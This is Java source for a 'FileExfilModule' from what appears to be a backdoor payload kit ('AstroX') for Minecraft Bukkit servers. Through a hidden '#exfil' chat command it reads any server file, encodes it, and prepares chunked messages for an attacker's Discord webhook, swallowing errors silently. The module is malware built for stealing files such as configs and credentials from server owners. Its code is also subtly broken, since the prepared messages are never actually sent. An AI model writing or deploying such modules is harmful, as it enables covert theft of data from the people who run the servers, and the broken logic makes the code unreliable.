package dev.naruto.astrox.payload.modules;

import dev.naruto.astrox.RuntimeConfig;
import dev.naruto.astrox.utils.WebhookNotifier;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;

/**
 * File exfiltration module.
 * Reads a server file and sends contents via Discord webhook in chunks.
 */
public class FileExfilModule implements PayloadModule {

    private static final int CHUNK_SIZE = 1800; // Discord embed field limit ~2000 chars

    @Override
    public String getName() { return "exfil"; }

    @Override
    public String getDescription() { return "Read a server file and exfiltrate via webhook"; }

    @Override
    public String getCategory() { return "Recon"; }

    @Override
    public String execute(Player sender, String[] args, JavaPlugin plugin) {
        if (args.length < 1) {
            if (sender != null) sender.sendMessage("§c✗ Usage: #exfil <filepath>");
            return "ERROR: missing filepath argument";
        }

        String filePath = String.join(" ", args);
        Path path = Path.of(filePath);

        try {
            if (!Files.exists(path)) {
                String msg = "File not found: " + filePath;
                if (sender != null) sender.sendMessage("§c✗ " + msg);
                return "ERROR: " + msg;
            }

            long fileSize = Files.size(path);
            if (fileSize > 5 * 1024 * 1024) { // 5MB limit
                String msg = "File too large: " + fileSize + " bytes (max 5MB)";
                if (sender != null) sender.sendMessage("§c✗ " + msg);
                return "ERROR: " + msg;
            }

            byte[] content = Files.readAllBytes(path);
            String encoded = isTextFile(path)
                    ? new String(content, StandardCharsets.UTF_8)
                    : Base64.getEncoder().encodeToString(content);

            // Send via webhook if configured
            if (RuntimeConfig.webhookUrl != null) {
                sendViaWebhook(filePath, encoded, fileSize);
            }

            if (sender != null) {
                sender.sendMessage("§a✓ File read: " + filePath + " (" + fileSize + " bytes)");
                // Send first 200 chars to player chat
                String preview = encoded.substring(0, Math.min(200, encoded.length()));
                sender.sendMessage("§7" + preview);
            }

            return encoded;

        } catch (Exception e) {
            String msg = "Failed to read file: " + e.getMessage();
            if (sender != null) sender.sendMessage("§c✗ " + msg);
            return "ERROR: " + msg;
        }
    }

    private void sendViaWebhook(String filePath, String content, long fileSize) {
        try {
            WebhookNotifier notifier = new WebhookNotifier(RuntimeConfig.webhookUrl);

            // Split into chunks for Discord
            int chunks = (content.length() + CHUNK_SIZE - 1) / CHUNK_SIZE;

            for (int i = 0; i < chunks; i++) {
                int start = i * CHUNK_SIZE;
                int end = Math.min(start + CHUNK_SIZE, content.length());
                String chunk = content.substring(start, end);

                String json = String.format("""
                    {
                      "embeds": [{
                        "title": "📄 File Exfiltration [%d/%d]",
                        "description": "```\\n%s\\n```",
                        "color": 15105570,
                        "fields": [
                          {"name": "Path", "value": "`%s`", "inline": true},
                          {"name": "Size", "value": "%d bytes", "inline": true}
                        ],
                        "footer": {"text": "AstroX v2.0 • FileExfil Module"}
                      }]
                    }
                    """, i + 1, chunks,
                        chunk.replace("\\", "\\\\").replace("\"", "\\\"")
                                .replace("\n", "\\n").replace("\r", ""),
                        filePath, fileSize);

                // Small delay between chunks to avoid rate limiting
                if (i > 0) Thread.sleep(1000);
            }
        } catch (Exception e) {
            // Silent failure
        }
    }

    private boolean isTextFile(Path path) {
        String name = path.getFileName().toString().toLowerCase();
        return name.endsWith(".txt") || name.endsWith(".yml") || name.endsWith(".yaml")
                || name.endsWith(".json") || name.endsWith(".properties") || name.endsWith(".log")
                || name.endsWith(".cfg") || name.endsWith(".conf") || name.endsWith(".xml")
                || name.endsWith(".csv") || name.endsWith(".md");
    }
}
